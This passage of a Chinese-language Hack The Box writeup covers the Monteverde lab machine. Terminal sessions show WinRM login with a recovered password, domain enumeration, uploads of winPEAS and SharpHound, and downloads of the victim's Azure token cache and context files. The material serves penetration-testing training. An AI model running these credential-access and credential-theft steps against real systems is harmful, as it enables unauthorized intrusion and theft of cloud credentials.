+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ crackmapexec winrm <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u mhope -p <span class="hljs-string">&#x27;4n0therD4y@n0th3r$&#x27;</span>             <br>SMB         <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [*] Windows <span class="hljs-number">10.0</span> Build <span class="hljs-number">17763</span> (name:MONTEVERDE) (domain:MEGABANK.LOCAL)<br>HTTP        <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [*] http:<span class="hljs-comment">//10.10.10.172:5985/wsman</span><br>WINRM       <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span>    <span class="hljs-number">5985</span>   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:<span class="hljs-number">4</span>n0therD4y@n0th3r$ (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<p>15、可以，那就获取第一个flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.172</span> -u mhope -p <span class="hljs-string">&#x27;4n0therD4y@n0th3r$&#x27;</span><br>                                        <br>Evil-WinRM shell v3<span class="hljs-number">.5</span><br>                                        <br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine<br>                                        <br>Data: For more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection to remote endpoint<br>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ls<br><br><br>    Directory: C:\Users\mhope\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">5</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM             <span class="hljs-number">34</span> user.txt<br><br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; type user.txt<br><span class="hljs-number">07</span>a4bb734a0ae8190569915469c443e0<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>16、我们开始简单的枚举一下用户权限和用户组之类的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net user<br><br>User accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>AAD_987d7f2f57d2         Administrator            dgalanos<br>Guest                    krbtgt                   mhope<br>roleary                  SABatchJobs              smorgan<br>svc-ata                  svc-bexec                svc-netapp<br>The command completed with one or more errors.<br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net group<br><br>Group Accounts <span class="hljs-keyword">for</span> \\<br><br>-------------------------------------------------------------------------------<br>*Azure Admins<br>*Call Recording Admins<br>*Cloneable Domain Controllers<br>*Developers<br>*DnsUpdateProxy<br>*Domain Admins<br>*Domain Computers<br>*Domain Controllers<br>*Domain Guests<br>*Domain Users<br>*Enterprise Admins<br>*Enterprise Key Admins<br>*Enterprise Read-only Domain Controllers<br>*File Server Admins<br>*Group Policy Creator Owners<br>*HelpDesk<br>*Key Admins<br>*Operations<br>*Protected Users<br>*Read-only Domain Controllers<br>*Reception<br>*Schema Admins<br>*Trading<br>The command completed with one or more errors.<br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net user mhope<br>User name                    mhope<br>Full Name                    Mike Hope<br>Comment<br>User<span class="hljs-number">&#x27;</span>s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last <span class="hljs-built_in">set</span>            <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">40</span>:<span class="hljs-number">05</span> PM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">4</span>:<span class="hljs-number">40</span>:<span class="hljs-number">05</span> PM<br>Password required            Yes<br>User may change password     No<br><br>Workstations allowed         All<br>Logon script<br>User profile<br>Home directory               \\monteverde\users$\mhope<br>Last logon                   <span class="hljs-number">5</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span> <span class="hljs-number">1</span>:<span class="hljs-number">54</span>:<span class="hljs-number">49</span> AM<br><br>Logon hours allowed          All<br><br>Local Group Memberships      *Remote Management Use<br>Global Group memberships     *Azure Admins         *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; net group <span class="hljs-string">&quot;Azure Admins&quot;</span><br>Group name     Azure Admins<br>Comment<br><br>Members<br><br>-------------------------------------------------------------------------------<br>AAD_987d7f2f57d2         Administrator            mhope<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-built_in">set</span> Enabled<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>17、发现了一个特殊的云组，但是我这里先搁置下，继续上工具枚举下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\mhope\Documents&gt; upload /home/kali/Desktop/tools/winPEASx64.exe ../Desktop<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/winPEASx64.exe to C:\Users\mhope\Documents\..\Desktop<br>                                        <br>Data: <span class="hljs-number">3183272</span> bytes of <span class="hljs-number">3183272</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd ../Desktop<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ls<br><br><br>    Directory: C:\Users\mhope\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-ar---        <span class="hljs-number">5</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM             <span class="hljs-number">34</span> user.txt<br>-a----        <span class="hljs-number">5</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">2</span>:<span class="hljs-number">04</span> AM        <span class="hljs-number">2387456</span> winPEASx64.exe<br><br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ./winPEASx64.exe<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   AAD_987d7f2f57d2<br>   User Id                 :   <span class="hljs-number">1104</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :   Service account <span class="hljs-keyword">for</span> the Synchronization Service with installation identifier <span class="hljs-number">05</span>c97990<span class="hljs-number">-7587</span><span class="hljs-number">-4</span>a3d-b312<span class="hljs-number">-309</span>adfc172d9 running on computer MONTEVERDE.<br>   Last Logon              :   <span class="hljs-number">5</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2024</span> <span class="hljs-number">11</span>:<span class="hljs-number">59</span>:<span class="hljs-number">00</span> PM<br>   Logons Count            :   <span class="hljs-number">11</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2020</span> <span class="hljs-number">3</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> PM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   svc-ata<br>   User Id                 :   <span class="hljs-number">2603</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">5</span>:<span class="hljs-number">58</span>:<span class="hljs-number">31</span> AM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   svc-bexec<br>   User Id                 :   <span class="hljs-number">2604</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">5</span>:<span class="hljs-number">59</span>:<span class="hljs-number">55</span> AM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   svc-netapp<br>   User Id                 :   <span class="hljs-number">2605</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">6</span>:<span class="hljs-number">01</span>:<span class="hljs-number">42</span> AM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   dgalanos<br>   User Id                 :   <span class="hljs-number">2613</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">6</span>:<span class="hljs-number">06</span>:<span class="hljs-number">10</span> AM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   roleary<br>   User Id                 :   <span class="hljs-number">2614</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">6</span>:<span class="hljs-number">08</span>:<span class="hljs-number">05</span> AM<br><br><br>   Computer Name           :   MONTEVERDE<br>   User Name               :   smorgan<br>   User Id                 :   <span class="hljs-number">2615</span><br>   Is Enabled              :   True<br>   User Type               :   User<br>   Comment                 :<br>   Last Logon              :   <span class="hljs-number">1</span>/<span class="hljs-number">1</span>/<span class="hljs-number">1970</span> <span class="hljs-number">12</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> AM<br>   Logons Count            :   <span class="hljs-number">0</span><br>   Password Last Set       :   <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">6</span>:<span class="hljs-number">09</span>:<span class="hljs-number">21</span> AM<br><br><br><br>https:<span class="hljs-comment">//book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files</span><br>    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)<br>    Accessed:<span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">5</span>:<span class="hljs-number">36</span>:<span class="hljs-number">14</span> AM -- Size:<span class="hljs-number">7896</span>                                                                                                                                           <br><br>    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)<br>    Accessed:<span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span> <span class="hljs-number">5</span>:<span class="hljs-number">35</span>:<span class="hljs-number">57</span> AM -- Size:<span class="hljs-number">2794</span>     <br></code></pre></td></tr></table></figure>
+
+<p>18、没太大的信息，不过在当前用户目录下发现了几个云配置的信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cd C:\Users\mhope\.azure\<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; ls<br><br><br>    Directory: C:\Users\mhope\.azure<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----         <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">35</span> AM                ErrorRecords<br>-a----         <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">31</span> AM             <span class="hljs-number">34</span> AzurePSDataCollectionProfile.json<br>-a----         <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">35</span> AM           <span class="hljs-number">2794</span> AzureRmContext.json<br>-a----         <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">31</span> AM            <span class="hljs-number">191</span> AzureRmContextSettings.json<br>-a----         <span class="hljs-number">1</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">5</span>:<span class="hljs-number">36</span> AM           <span class="hljs-number">7896</span> TokenCache.dat<br><br><br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; <br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; download AzurePSDataCollectionProfile.json<br>                                        <br>Info: Downloading C:\Users\mhope\.azure\AzurePSDataCollectionProfile.json to AzurePSDataCollectionProfile.json<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; download AzureRmContext.json<br>                                        <br>Info: Downloading C:\Users\mhope\.azure\AzureRmContext.json to AzureRmContext.json<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt;<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; download AzureRmContextSettings.json<br>                                        <br>Info: Downloading C:\Users\mhope\.azure\AzureRmContextSettings.json to AzureRmContextSettings.json<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; download TokenCache.dat<br>                                        <br>Info: Downloading C:\Users\mhope\.azure\TokenCache.dat to TokenCache.dat<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\mhope\.azure&gt; <br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Monteverde-htb-writeup/1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Monteverde-htb-writeup/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="http://sh1yan.top/photo/Monteverde-htb-writeup/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>http:\sh1yan.top\photo\Monteverde-htb-writeup&#x2F;111.txt.json</p>
+<p>19、奈何水平太差，没有啥发现，我就特意上传下bloodhound工具进行枚举</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c">*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; upload /home/kali/Desktop/tools/SharpHound/SharpHound.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/tools/SharpHound/SharpHound.exe to C:\Users\mhope\Desktop\SharpHound.exe<br>                                        <br>Data: <span class="hljs-number">1395368</span> bytes of <span class="hljs-number">1395368</span> bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; .\SharpHound.exe -c all -d MEGABANK.LOCAL<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">34.9091996</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|This version of SharpHound is compatible with the <span class="hljs-number">4.3</span><span class="hljs-number">.1</span> Release of BloodHound<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">35.0185807</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">35.0343284</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Initializing SharpHound at <span class="hljs-number">2</span>:<span class="hljs-number">37</span> AM on <span class="hljs-number">5</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2024</span><br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">37.7060717</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller <span class="hljs-keyword">for</span> MEGABANK.LOCAL : MONTEVERDE.MEGABANK.LOCAL<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">38.0341967</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">38.1279490</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Beginning LDAP search <span class="hljs-keyword">for</span> MEGABANK.LOCAL<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">38.1592002</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Producer has finished, closing LDAP channel<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">37</span>:<span class="hljs-number">38.1592002</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|LDAP channel closed, waiting <span class="hljs-keyword">for</span> consumers<br><span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-11</span>T02:<span class="hljs-number">38</span>:<span class="hljs-number">08.1748588</span><span class="hljs-number">-07</span>:<span class="hljs-number">00</span>|INFORMATION|Status: <span class="hljs-number">0</span> objects <span class="hljs-title function_">finished</span> <span class="hljs-params">(+<span class="hljs-number">0</span> <span class="hljs-number">0</span>)</span>/s -- Using 35 MB RAM<br>2024-05-11T02:38:23.4560715-07:00|INFORMATION|Consumers finished, closing output channel<br>2024-05-11T02:38:23.4716995-07:00|INFORMATION|Output channel closed, waiting <span class="hljs-keyword">for</span> output task to complete<br>Closing writers<br>2024-05-11T02:38:23.5810726-07:00|INFORMATION|Status: 121 objects <span class="hljs-title function_">finished</span> <span class="hljs-params">(+<span class="hljs-number">121</span> <span class="hljs-number">2.688889</span>)</span>/s -- Using 43 MB RAM<br>2024-05-11T02:38:23.5810726-07:00|INFORMATION|Enumeration finished in 00:00:45.4458643<br>2024-05-11T02:38:23.6279476-07:00|INFORMATION|Saving cache with stats: 79 ID to type mappings.<br> 79 name to SID mappings.<br> 0 machine sid mappings.<br> 2 sid to domain mappings.<br> 0 global catalog mappings.<br>2024-05-11T02:38:23.6435734-07:00|INFORMATION|SharpHound Enumeration Completed at 2:38 AM on 5/11/2024! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ls<br><br><br>    Directory: C:\Users\mhope\Desktop<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        5/11/2024   2:38 AM          13457 20240511023823_BloodHound.zip<br>-a----        5/11/2024   2:38 AM          11927 MmU4ODNmNTctYjM2MS00N2U1LWI5NjctNDg2N2E5YmZmZmEx.bin<br>-a----        5/11/2024   2:31 AM         276992 Rubeus.exe<br>-a----        5/11/2024   2:36 AM        1046528 SharpHound.exe<br>-ar---        5/10/2024  11:57 PM             34 user.txt<br>-a----        5/11/2024   2:04 AM        2387456 winPEASx64.exe<br><br><br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; download 20240511023823_BloodHound.zip<br>                                        <br>Info: Downloading C:\Users\mhope\Desktop\20240511023823_BloodHound.zip to 20240511023823_BloodHound.zip<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:\Users\mhope\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Monteverde-htb-writeup/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>20、整体分析下来，感觉这里没有路，我继续回到一开始那个权限组里</p>
+<p><code>Azure Admins</code></p>
+<p><code>https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation</code></p>
+<p><img src="http://sh1yan.top/photo/Monteverde-htb-writeup/5.png" srcset="/img/loading.gif" lazyload></p>
